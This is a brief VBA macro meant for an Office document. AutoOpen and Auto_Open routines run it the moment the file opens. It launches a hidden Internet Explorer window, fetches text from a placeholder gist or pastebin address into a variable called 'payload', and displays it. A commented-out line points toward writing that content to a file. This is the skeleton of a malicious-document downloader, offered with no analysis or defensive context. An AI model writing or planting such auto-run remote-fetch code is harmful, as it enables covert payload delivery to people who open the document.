Sub CallOut()
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Visible = 0
    URL = "GIST.GITHUB OR PASTEBIN - WHATEVES"
    ie.Navigate URL
    
    State = 0
    Do Until State = 4
        DoEvents
        State = ie.readyState
    Loop
    Dim payload: payload = ie.Document.Body.innerText
    MsgBox payload, vbInformation Or vbOKOnly, "Readall"
    'Set objFile = fso.OpenTextFile
End Sub
Sub AutoOpen()
    CallOut
End Sub
Sub Auto_Open()
    CallOut
End Sub
